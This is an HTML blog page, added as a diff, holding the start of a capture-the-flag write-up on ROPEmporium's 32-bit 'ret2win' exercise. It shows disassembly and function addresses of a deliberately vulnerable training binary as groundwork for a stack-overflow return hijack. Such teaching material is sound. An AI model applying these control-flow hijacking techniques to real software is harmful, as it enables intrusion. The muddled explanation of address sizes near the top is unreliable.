@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.92.2" />
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="" />
+  <meta property="og:url" content="http://example.org/posts/ret2win32/" />
+  <link rel="canonical" href="http://example.org/posts/ret2win32/" /><link rel="alternate" type="application/atom+xml" href="http://example.org/index.xml" title="My New Hugo Site">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "http:\/\/example.org\/"
+      },
+      "articleSection" : "posts",
+      "name" : "ROPEmporium: ret2win 32-bit",
+      "headline" : "ROPEmporium: ret2win 32-bit",
+      "description" : "Writeup of return to win [Ret2win] on ROPEmporium Prerequisites: Basic knowledge of assembly and disassembling tools\n[Note: Main difference between 32-bit and 64-bit is that the arguments are passed on the stack instead of in registers, and that the sizes of 32-bit and 64-bit addresses are in said order, 4 bytes and 8 bytes of size, reason for the sizes being that is that each byte consists of two nibbles each of which has 4 bits.",
+      "inLanguage" : "en-US",
+      "author" : "",
+      "creator" : "",
+      "publisher": "",
+      "accountablePerson" : "",
+      "copyrightHolder" : "",
+      "copyrightYear" : "2021",
+      "datePublished": "2021-05-24 14:20:00 \u002b0200 CEST",
+      "dateModified" : "2021-05-24 14:20:00 \u002b0200 CEST",
+      "url" : "http:\/\/example.org\/posts\/ret2win32\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>ROPEmporium: ret2win 32-bit</title>
+  <meta property="og:title" content="ROPEmporium: ret2win 32-bit" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="Writeup of return to win [Ret2win] on ROPEmporium Prerequisites: Basic knowledge of assembly and disassembling tools
+[Note: Main difference between 32-bit and 64-bit is that the arguments are passed on the stack instead of in registers, and that the sizes of 32-bit and 64-bit addresses are in said order, 4 bytes and 8 bytes of size, reason for the sizes being that is that each byte consists of two nibbles each of which has 4 bits." />
+  <meta name="description" content="Writeup of return to win [Ret2win] on ROPEmporium Prerequisites: Basic knowledge of assembly and disassembling tools
+[Note: Main difference between 32-bit and 64-bit is that the arguments are passed on the stack instead of in registers, and that the sizes of 32-bit and 64-bit addresses are in said order, 4 bytes and 8 bytes of size, reason for the sizes being that is that each byte consists of two nibbles each of which has 4 bits." />
+  <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
+  
+
+  
+    <style>body{font-family:bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:16px;overflow:auto;border-radius:10px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="My New Hugo Site">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post " id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >cavefx</a
+    >
+  </div>
+  <div class="header-subtitle"></div>
+</header>
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="/about" target="_blank">About Me</a>
+  </div>
+  
+</div>
+<div class="row end-xs">
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">ROPEmporium: ret2win 32-bit</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2021-05-24 14:20:00 CEST">
+                24 May 2021
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h1 id="writeup-of-return-to-win-ret2win-on-ropemporium">Writeup of return to win [Ret2win] on ROPEmporium</h1>
+<p>Prerequisites: Basic knowledge of assembly and disassembling tools</p>
+<p>[Note: Main difference between 32-bit and 64-bit is that the arguments are passed on the stack instead of in registers, and that the sizes of 32-bit and 64-bit addresses are in said order, 4 bytes and 8 bytes of size, reason for the sizes being that is that each byte consists of two nibbles each of which has 4 bits. ((4*2)*8)=64-bit]</p>
+<hr>
+<p>Let&rsquo;s start by disassembling the binary with radare2&rsquo;s visual mode. I started by passing aaa to radare2, to analyze the binary and then went into visual mode.
+If you&rsquo;re unsure about how this works, look up a radare2 tutorial on YouTube.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f92672">&gt;*</span> <span style="color:#ae81ff">0x08048430</span>   <span style="color:#ae81ff">50</span> entry0                                   
+   <span style="color:#ae81ff">0x08048463</span>    <span style="color:#ae81ff">4</span> fcn<span style="color:#ae81ff">.08048463</span>                             
+   <span style="color:#ae81ff">0x080483f0</span>    <span style="color:#ae81ff">6</span> sym.imp.__libc_start_main            
+   <span style="color:#ae81ff">0x08048490</span>   <span style="color:#ae81ff">41</span> sym.deregister_tm_clones                
+   <span style="color:#ae81ff">0x080484d0</span>   <span style="color:#ae81ff">54</span> sym.register_tm_clones                 
+   <span style="color:#ae81ff">0x08048510</span>   <span style="color:#ae81ff">31</span> entry.fini0                                 
+   <span style="color:#ae81ff">0x08048540</span>    <span style="color:#ae81ff">6</span> entry.init0                        
+   <span style="color:#ae81ff">0x080485ad</span>  <span style="color:#ae81ff">127</span> sym.pwnme                              
+   <span style="color:#ae81ff">0x08048410</span>    <span style="color:#ae81ff">6</span> sym.imp.memset                          
+   <span style="color:#ae81ff">0x080483d0</span>    <span style="color:#ae81ff">6</span> sym.imp.puts                             
+   <span style="color:#ae81ff">0x080483c0</span>    <span style="color:#ae81ff">6</span> sym.imp.printf                       
+   <span style="color:#ae81ff">0x080483b0</span>    <span style="color:#ae81ff">6</span> sym.imp.read                          
+   <span style="color:#ae81ff">0x0804862c</span>   <span style="color:#ae81ff">41</span> sym.ret2win                           
+   <span style="color:#ae81ff">0x080483e0</span>    <span style="color:#ae81ff">6</span> sym.imp.system                   
+   <span style="color:#ae81ff">0x080486c0</span>    <span style="color:#ae81ff">2</span> sym.__libc_csu_fini                   
+   <span style="color:#ae81ff">0x08048480</span>    <span style="color:#ae81ff">4</span> sym.__x86.get_pc_thunk.bx                
+   <span style="color:#ae81ff">0x080486c4</span>   <span style="color:#ae81ff">20</span> sym._fini                           
+   <span style="color:#ae81ff">0x08048660</span>   <span style="color:#ae81ff">93</span> sym.__libc_csu_init                     
+   <span style="color:#ae81ff">0x08048470</span>    <span style="color:#ae81ff">2</span> sym._dl_relocate_static_pie
+   <span style="color:#ae81ff">0x08048546</span>  <span style="color:#ae81ff">103</span> main                                     
+   <span style="color:#ae81ff">0x08048400</span>    <span style="color:#ae81ff">6</span> sym.imp.setvbuf
+   <span style="color:#ae81ff">0x08048374</span>   <span style="color:#ae81ff">35</span> sym._init 
+</code></pre></div><p>This is the information I got. I see a sym.ret2win, let&rsquo;s look at that!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">┌──────────────────────────────────────────┐</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> [<span style="color:#ae81ff">0x804862c</span>]                              <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">:</span> sym.ret2win ();                      <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> push ebp                                 <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> mov ebp, esp                             <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> sub esp, <span style="color:#ae81ff">8</span>                               <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> sub esp, <span style="color:#ae81ff">0xc</span>                             <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s                          <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#ae81ff">0x80487f6</span>                              <span style="color:#960050;background-color:#1e0010">│</span>                                                 
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#e6db74">&#34;Well done! Here&#39;s your flag:&#34;</span>         <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> push str.Well_done__Here_s_your_flag:    <span style="color:#960050;background-color:#1e0010">│</span>                                                      
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">puts</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s)                <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> call sym.imp.puts;[oa]                   <span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#960050;background-color:#1e0010">#</span>Calls puts, which will place the string                                                   
+<span style="color:#960050;background-color:#1e0010">│</span> add esp, <span style="color:#ae81ff">0x10</span>                            <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> sub esp, <span style="color:#ae81ff">0xc</span>                             <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>string                     <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#ae81ff">0x8048813</span>                              <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>                    <span style="color:#960050;background-color:#1e0010">│</span>                                                    
+<span style="color:#960050;background-color:#1e0010">│</span> push str.bin_cat_flag.txt                <span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#960050;background-color:#1e0010">#</span>Pushes the string: <span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span> <span style="color:#f92672">-</span> Try running this in your terminal                                                 
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">system</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>string)         <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> call sym.imp.system;[ob]                 <span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#960050;background-color:#1e0010">#</span>Syscall system, using the top of the stack as an argument (Here the latest pushed item <span style="color:#f92672">&amp;</span> top of stack is the string)                                                   
+<span style="color:#960050;background-color:#1e0010">│</span> add esp, <span style="color:#ae81ff">0x10</span>                            <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> nop                                      <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> leave                                    <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#f92672">|</span> ret                                      <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">└──────────────────────────────────────────┘</span>  
+</code></pre></div><p>So somehow if we can return to this function, we&rsquo;ll get the flag. Great!
+Let&rsquo;s look at another function, sym.pwnme (?) That sounds interesting. Let&rsquo;s use gdb(pwndbg) instead this time around. With &ldquo;info functions&rdquo;, or &ldquo;inf fu&rdquo; we can see functions and their addresses.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">pwndbg<span style="color:#f92672">&gt;</span> inf fu
+All defined functions:
+Non<span style="color:#f92672">-</span>debugging symbols:
+<span style="color:#ae81ff">0x08048374</span>  _init
+<span style="color:#ae81ff">0x080483b0</span>  read<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x080483c0</span>  printf<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x080483d0</span>  puts<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x080483e0</span>  system<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x080483f0</span>  __libc_start_main<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08048400</span>  setvbuf<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08048410</span>  memset<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08048420</span>  __gmon_start__<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08048430</span>  _start
+<span style="color:#ae81ff">0x08048470</span>  _dl_relocate_static_pie
+<span style="color:#ae81ff">0x08048480</span>  __x86.get_pc_thunk.bx
+<span style="color:#ae81ff">0x08048490</span>  deregister_tm_clones
+<span style="color:#ae81ff">0x080484d0</span>  register_tm_clones
+<span style="color:#ae81ff">0x08048510</span>  __do_global_dtors_aux
+<span style="color:#ae81ff">0x08048540</span>  frame_dummy
+<span style="color:#ae81ff">0x08048546</span>  main
+<span style="color:#ae81ff">0x080485ad</span>  pwnme
+<span style="color:#ae81ff">0x0804862c</span>  ret2win
+<span style="color:#ae81ff">0x08048660</span>  __libc_csu_init
+<span style="color:#ae81ff">0x080486c0</span>  __libc_csu_fini
